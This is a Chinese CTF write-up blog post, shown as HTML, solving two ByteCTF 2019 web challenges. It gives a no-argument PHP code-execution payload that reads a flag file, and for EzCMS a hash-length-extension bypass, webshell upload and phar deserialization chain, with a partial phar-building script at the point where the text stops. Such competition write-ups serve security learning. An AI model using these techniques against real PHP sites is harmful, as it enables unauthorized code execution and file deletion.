<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。
"><title>ByteCTF 2019 Web WP</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/09/17/bytectf2019/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="ByteCTF 2019 Web WP">
<meta property="og:description" content="周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/09/17/bytectf2019/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="sql注入"><meta property="article:published_time" content="2019-09-17T10:11:20+00:00"><meta property="article:modified_time" content="2019-09-17T10:11:20+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="ByteCTF 2019 Web WP">
<meta name=twitter:description content="周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/09/17/bytectf2019/>ByteCTF 2019 Web WP</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 17, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
10 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。</p>
<h1 id=web>Web</h1>
<h2 id=boring_code>boring_code</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>is_valid_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>filter_var</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>FILTER_VALIDATE_URL</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/data:\/\//i&#39;</span><span class=p>,</span> <span class=nv>$url</span><span class=p>))</span> <span class=p>{</span>
            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
<span class=p>}</span>

<span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>])){</span>
    <span class=nv>$url</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>is_valid_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>))</span> <span class=p>{</span>
        <span class=nv>$r</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/baidu\.com$/&#39;</span><span class=p>,</span> <span class=nv>$r</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>]))</span> <span class=p>{</span>
            <span class=nv>$code</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
            <span class=k>if</span> <span class=p>(</span><span class=s1>&#39;;&#39;</span> <span class=o>===</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/[a-z]+\((?R)?\)/&#39;</span><span class=p>,</span> <span class=k>NULL</span><span class=p>,</span> <span class=nv>$code</span><span class=p>))</span> <span class=p>{</span>
                <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;</span><span class=p>,</span> <span class=nv>$code</span><span class=p>))</span> <span class=p>{</span>
                    <span class=k>echo</span> <span class=s1>&#39;bye~&#39;</span><span class=p>;</span>
                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                    <span class=k>eval</span><span class=p>(</span><span class=nv>$code</span><span class=p>);</span>
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;error: host not allowed&#34;</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=s2>&#34;error: invalid url&#34;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span><span class=k>else</span><span class=p>{</span>
    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>审计题，由 <a class=link href=https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 target=_blank rel=noopener>PHP SSRF Techniques</a> 这篇文章我们可以知道有几种 bypass trick，与题目比较类似的是最后一种 trick ，使用 data 协议绕过进行 xss</p>
<pre tabindex=0><code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=
</code></pre><p>但是我们这里 data 直接被 ban 掉了，就没办法了&mldr;</p>
<p>这里我们队 @rmb122 师傅是直接买了一个域名<code>xxxxbaidu.com</code>这样，然后起个 http 服务就行，然而看了 ROIS 的 wp ，还有一个比较有意思的解法，就是利用百度爬虫。</p>
<p>在百度搜索界面如果爬到的自己网站的话，点击自己的网站，并不是直接访问自己的网站，而是百度有一个重定向的机制，将你的网站转换成了类似如下的形式</p>
<pre tabindex=0><code>http://www.baidu.com/link?url=7W9evem35YiIRoQTUDMHxL5ZzKqb8nlwG_me93YTuIZLKV6l0YLOZcxWlVTdNGPQ70SncapWoM5ceZ55fUae6a
</code></pre><p>最终还是会跳转到你的网站，但是这个要求就是需要让百度的虫子爬到自己的网站，百度爬虫一般是两三天生效，所以如果是早就有自己的站并且被百度爬虫爬了的，或者在百度站长上提交了的都可以采用这种类似的方法进行绕过。</p>
<p>接下来一个正则<code>/[a-z]+\((?R)?\)/</code>，就是一个无参数 RCE 了，意思就是只允许使用类似<code>a(b(c()));</code>这种形式，并且过滤了下划线，很多函数都不能用了。</p>
<p>再接下来一个正则<code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i</code>，就是一个简单的关键字过滤了，我们可以使用<code>get_definded_functions</code>来取得所有内置可用函数，再用这个正则过滤，保留最后剩下的函数，用这个函数绕过上面的正则就行了。</p>
<p>根据题目提示，题目的 Web 目录形式大致是</p>
<pre tabindex=0><code>.
├── code
│   └── index.php
└── index.php

1 directory, 2 files
</code></pre><p>我们运行的源代码是在 code 文件夹下，而 flag 是在与 code 目录平级的 index.php 文件中，意思就是我们需要获得<code>../index.php</code>的源码，我们可以构建一个类似的代码环境方便调试。</p>
<p>所以第一个我们比较容易想到的是用<code>scandir</code>函数拿到当前目录，得到一个数组，使用<code>chdir</code>函数跳到上级目录，再用<code>readfile</code>进行读取。</p>
<p>首先用<code>scandir</code>得到当前目录数组：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>));</span>
<span class=k>array</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
  <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;.&#34;</span>
  <span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;..&#34;</span>
  <span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;test.php&#34;</span>
<span class=p>}</span>
</code></pre></div><p>可以看到<code>..</code>是在第二个，也就是数组的 array[1] 位置，于是我们可以使用<code>next</code>函数获得数组第二个字符串。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>next</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)));</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=nx>Only</span> <span class=nx>variables</span> <span class=nx>should</span> <span class=nx>be</span> <span class=nx>passed</span> <span class=nx>by</span> <span class=nx>reference</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;..&#34;</span>
</code></pre></div><p>接着用<code>chdir</code>函数跳到上级目录：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>chdir</span><span class=p>(</span><span class=nx>next</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>))));</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=nx>Only</span> <span class=nx>variables</span> <span class=nx>should</span> <span class=nx>be</span> <span class=nx>passed</span> <span class=nx>by</span> <span class=nx>reference</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=nx>bool</span><span class=p>(</span><span class=k>true</span><span class=p>)</span>
</code></pre></div><p>虽然有一个 PHP Notice ，但是也误伤大雅，这里关键的是<code>chdir</code>返回值是个<code>bool(true)</code>，并没有返回上级目录数组什么的，这样我们貌似就不能获取到上级目录下的文件了，也就不能拿到源码了。</p>
<p>我们暂时先抛开这个问题，先假设到了上级目录，那我们是不是也可以像上面的方法一样，用<code>sandir</code>获得数组来进一步读取文件呢？</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>));</span>
<span class=k>array</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
  <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;.&#34;</span>
  <span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;..&#34;</span>
  <span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;code&#34;</span>
  <span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span> <span class=s2>&#34;index.php&#34;</span>
<span class=p>}</span>
</code></pre></div><p>这样我们就可以看到我们的目标文件了，因为目录排序的原因， i 在 c 的后面，所以我们肯定可以直接用<code>end</code>函数直接获取这个数组的最后一个拿到<code>index.php</code>字符串，</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>end</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)));</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=nx>Only</span> <span class=nx>variables</span> <span class=nx>should</span> <span class=nx>be</span> <span class=nx>passed</span> <span class=nx>by</span> <span class=nx>reference</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span> <span class=s2>&#34;index.php&#34;</span>
</code></pre></div><p>接着我们就可以愉快的用<code>readfile</code>来获取 flag 了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>readfile</span><span class=p>(</span><span class=nx>end</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>))));</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=nx>Only</span> <span class=nx>variables</span> <span class=nx>should</span> <span class=nx>be</span> <span class=nx>passed</span> <span class=nx>by</span> <span class=nx>reference</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=o>&lt;?</span><span class=nx>php</span>
<span class=nv>$flag</span> <span class=o>=</span> <span class=s2>&#34;This is index.php! And you get flag!&#34;</span><span class=p>;</span><span class=nx>int</span><span class=p>(</span><span class=mi>54</span><span class=p>)</span>
</code></pre></div><p>前面后面我们都打通了，现在唯一缺的就是如何把<code>chdir</code>返回的<code>bool(true)</code>变成<code>.</code>以便<code>scandir</code>函数调用的问题了。</p>
<p>经过 @rmb122 师傅的发掘，<code>microtime</code>可以接受一个<code>bool(true)</code>参数，并返回当前 Unix 时间戳和微秒数</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>microtime</span><span class=p>(</span><span class=k>true</span><span class=p>));</span>
<span class=nx>float</span><span class=p>(</span><span class=mf>1568657564.377</span><span class=p>)</span>
</code></pre></div><p>乍一看没什么用，但是我们依然可以配合<code>chr</code>函数来进行 ascii 码转换，当时间到了指定时间，我们就可以拿到<code>.</code>字符了！于是这样一开始如何构造最开始的<code>.</code>这个问题也可以解决了！</p>
<p>于是整个 payload 就是：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>readfile</span><span class=p>(</span><span class=nx>end</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>chr</span><span class=p>(</span><span class=nx>microtime</span><span class=p>(</span><span class=nx>chdir</span><span class=p>(</span><span class=nx>next</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>chr</span><span class=p>(</span><span class=nx>time</span><span class=p>())))))))));</span>
</code></pre></div><p>这个方法的缺点也比较明显，需要爆破&mldr;于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190917021622.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190917021622.png loading=lazy>
</a>
</figure></p>
<h2 id=ezcms>EzCMS</h2>
<p>这个题不想评价太多&mldr;拿我出的 SUCTF upload labs 2 来魔改的题，这里就简要说说点，不再详细赘述了。</p>
<p>这个题也是个上传的环境，但是上传有一个限制以及还有一个可疑的<code>__call</code>魔术方法</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>class</span> <span class=nc>Profile</span><span class=p>{</span>
    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$admin</span><span class=p>;</span>
    <span class=k>public</span> <span class=k>function</span> <span class=nf>is_admin</span><span class=p>(){</span>
        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>
        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
        <span class=nv>$secret</span> <span class=o>=</span> <span class=s2>&#34;********&#34;</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>===</span> <span class=s2>&#34;admin&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>!=</span> <span class=s2>&#34;admin&#34;</span><span class=p>){</span>
            <span class=k>if</span> <span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$secret</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>)){</span>
                <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span> <span class=nv>$arguments</span><span class=p>)</span>
    <span class=p>{</span>
        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>admin</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>);</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>这里可以用 hash 长度拓展来绕过，hashpump 就行。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$file_tmp</span><span class=p>,</span> <span class=nv>$size</span><span class=p>)</span>
<span class=p>{</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>upload_dir</span> <span class=o>=</span> <span class=s1>&#39;sandbox/&#39;</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]);</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>upload_dir</span><span class=p>)){</span>
    <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>upload_dir</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>upload_dir</span><span class=o>.</span><span class=s1>&#39;/.htaccess&#39;</span><span class=p>)){</span>
    <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>upload_dir</span><span class=o>.</span><span class=s1>&#39;/.htaccess&#39;</span><span class=p>,</span> <span class=s1>&#39;lolololol, i control all&#39;</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>size</span> <span class=o>=</span> <span class=nv>$size</span><span class=p>;</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_tmp</span> <span class=o>=</span> <span class=nv>$file_tmp</span><span class=p>;</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content_check</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Check</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_tmp</span><span class=p>);</span>
  <span class=nv>$profile</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Profile</span><span class=p>();</span>
  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checker</span> <span class=o>=</span> <span class=nv>$profile</span><span class=o>-&gt;</span><span class=na>is_admin</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></div><p>虽然可以上传任意后缀的文件，但是上传目录下有被控制的<code>.htaccess</code>，导致我们上传的 php 文件不能解析，而且每次登录都会生成这个<code>.htaccess</code>文件，不能被绕过。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>class</span> <span class=nc>File</span><span class=p>{</span>
  <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
  <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checker</span><span class=p>)){</span>
      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checker</span><span class=o>-&gt;</span><span class=na>upload_file</span><span class=p>();</span>
    <span class=p>}</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>整个题唯一一个<code>__destruct</code>函数，不用猜就知道是利用这个点</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>class</span> <span class=nc>File</span><span class=p>{</span>
  <span class=k>public</span> <span class=k>function</span> <span class=nf>view_detail</span><span class=p>(){</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filepath</span><span class=p>)){</span>
      <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nonono~&#34;</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nv>$mine</span> <span class=o>=</span> <span class=nx>mime_content_type</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filepath</span><span class=p>);</span>
    <span class=nv>$store_path</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filepath</span><span class=p>);</span>
    <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;mine&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$mine</span><span class=p>;</span>
    <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;store_path&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$store_path</span><span class=p>;</span>
    <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>这里是一个很明显的 phar 反序列化的点，触发函数是<code>mime_content_type</code>，触发流是<code>php://filter</code>。</p>
<p>整个题的意思也比较明显，但是一开始不是很 get 到点，给出的那个<code>__call</code>魔术方法有点莫名其妙，然后一直去日<code>move_uploaded_file</code>方法去了，结果发现这个根本日不动。然后经过马师傅的提醒，get 了一个 <a class=link href=https://www.php.net/manual/en/ziparchive.open.php target=_blank rel=noopener>ZipArchive::open</a> 函数，然后一切就明白了，随手一搜就是个原题魔改题 <a class=link href=https://www.anquanke.com/post/id/95896 target=_blank rel=noopener>Insomni&rsquo;hack Teaser 2018比赛Write Up：File Vault题目</a>，可以使用 ZipArchive->open 方法达到删除目标文件。</p>
<p>所以整个利用链就比较清晰了， hash 拓展绕过上传限制，上传一个 webshell ，再构造一个 ZipArchive 类的 phar 包上传，用<code>php://filter/resource=phar://</code>触发 phar 反序列化删除自己目录下的<code>.htaccess</code>文件，直接 getflag 。</p>
<p>构造 phar 包的代码如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>class</span> <span class=nc>Check</span><span class=p>{</span>
    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>

    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span>
    <span class=p>{</span>
        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>class</span> <span class=nc>File</span><span class=p>{</span>

    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$filepath</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$checker</span><span class=p>;</span>

<span class=p>}</span>

<span class=k>class</span> <span class=nc>Admin</span><span class=p>{</span>
    <span class=k>public</span> <span class=nv>$size</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$checker</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$file_tmp</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$upload_dir</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$content_check</span><span class=p>;</span>
<span class=p>}</span>

<span class=k>class</span> <span class=nc>Profile</span><span class=p>{</span>

    <span class=k>public</span> <span class=nv>$username</span> <span class=o>=</span> <span class=s2>&#34;/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess&#34;</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$password</span> <span class=o>=</span> <span class=s2>&#34;9&#34;</span><span class=p>;</span>
    <span class=k>public</span> <span class=nv>$admin</span><span class=p>;</span>

<span class=p>}</span>

<span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
    <span class=k>public</span> <span class=nv>$a</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
<span class=p>}</span>

<span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;1.phar&#34;</span><span class=p>);</span>

<span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;1.phar&#34;</span><span class=p>);</span> <span class=c1>//后缀名必须为phar
</span><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
<span class=c1>// &lt;?php __HALT_COMPILER();
</span><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span> <span class=o>.</span> <span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span> <span class=c1>//设置stub
